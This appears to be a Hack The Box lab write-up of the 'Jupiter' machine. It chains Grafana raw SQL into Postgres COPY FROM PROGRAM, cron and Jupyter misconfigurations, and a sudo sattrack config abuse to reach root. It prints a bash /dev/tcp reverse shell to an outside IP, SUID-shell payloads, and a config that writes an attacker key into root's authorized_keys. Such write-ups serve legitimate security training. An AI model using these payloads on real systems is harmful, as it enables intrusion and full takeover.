---
layout: post
title: "HTB: Jupiter"
subtitle: "Grafana SQL panel to Postgres COPY FROM PROGRAM, then three local hops to root via a sudo sattrack binary"
date: 2023-06-11
tags: [htb, linux, grafana, postgresql, jupyter, sudo]
category: writeups
tldr: "A kiosk subdomain ran Grafana 9.5.2, whose query endpoint let me run raw SQL against Postgres. COPY FROM PROGRAM gave a shell as postgres. From there a world-writable shadow simulation config run by a cron got me juno, a leaked Jupyter Notebook token got me jovian, and a sudo sattrack binary that reads /tmp/config.json let me write root's authorized_keys."
---

## the box

Jupiter is a medium Linux box and a long chain. Ports `22` (OpenSSH 8.9p1) and `80` (nginx 1.18.0) were open, and 80 redirected to `jupiter.htb`. Subdomain fuzzing found one vhost:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.jupiter.htb" -u http://jupiter.htb -fs 178
```

That returned `kiosk`, which served Grafana v9.5.2.

## foothold

The kiosk dashboard panels query Postgres through Grafana's `/api/ds/query` endpoint, and the request body carries a `rawSql` field. The datasource was a Postgres connection, so I could replace the dashboard query with my own SQL. A quick `select version();` confirmed control:

```
PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1) ...
```

Postgres can run shell commands through `COPY ... FROM PROGRAM`, so I dropped a reverse shell straight into the SQL:

```sql
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.83/1337 0>&1"'
```

That gave a shell as the `postgres` user.

## user

### postgres to juno

pspy showed juno running a shadow network simulation on a cron:

```
UID=1000 PID=190758 | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
```

The config file `/dev/shm/network-simulation.yml` was mode 777 and, conveniently, created by the postgres user I already controlled. The simulation runs the processes listed under each host, so I rewrote the YAML to copy bash and set it SUID:

```yaml
hosts:
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```

When the cron fired, `/tmp/bash` was a SUID copy owned by juno. `/tmp/bash -p` gave a juno shell. I appended my SSH key to juno's authorized_keys and logged in cleanly. That got the user flag.

### juno to jovian

A local service was listening on `127.0.0.1:8888`. The logs under `/opt/solar-flares/logs/` were group-readable by juno, and a recent Jupyter Notebook log leaked the access token:

```
[I 15:02:39.572 NotebookApp] Jupyter Notebook 6.5.3 is running at:
[I 15:02:39.572 NotebookApp] http://localhost:8888/?token=6eaf64d92fea64f9718f44fdbb711d6022208c4b2791d742
```

I forwarded 8888, used the token to open a notebook, and ran Python that shells out as the notebook owner, jovian:

```python
import os; os.system("cp /bin/bash /tmp/loull; chmod u+s /tmp/loull")
```

`./loull -p` gave jovian, and again I dropped my SSH key for a stable session.

## root

jovian had a sudo rule:

```
User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

`sattrack` is a root-owned ELF that uses the nlohmann json library. Static analysis in Ghidra showed it reads its config from `/tmp/config.json` and validates keys like `tleroot`, `tlefile`, `mapfile`, `tlesources` and a station block. The config controls where it downloads TLE source files to (`tleroot` plus `tlefile`) and which URLs it fetches from (`tlesources`). Since it runs as root, I pointed it at my own server and wrote into root's `.ssh`:

```json
{
    "tleroot": "/root/.ssh/",
    "tlefile": "authorized_keys",
    "mapfile": "/usr/local/share/sattrack/map.json",
    "texturefile": "/usr/local/share/sattrack/earth.png",
    "tlesources": [
        "http://10.10.16.83:8000/authorized_keys"
    ],
    "updatePerdiod": 1000,
    "station": {
        "name": "LORCA",
        "lat": 37.6725,
        "lon": -1.5863,
        "hgt": 335.0
    },
    "show": [],
    "columns": ["name","azel","dis","geo","tab","pos","vel"]
}
```

I hosted my public key as `authorized_keys`, ran `sudo sattrack`, and it downloaded my key straight into `/root/.ssh/authorized_keys`. SSH as root gave the root flag.

## takeaway

Five identities to reach root, and each hop was its own misconfiguration. Grafana trusting a client-supplied SQL query, a cron reading a 777 config, a notebook token sitting in a group-readable log, and a sudo binary that takes its file destinations from an attacker-writable config. None needed an exploit, just trusting input that should not be trusted.
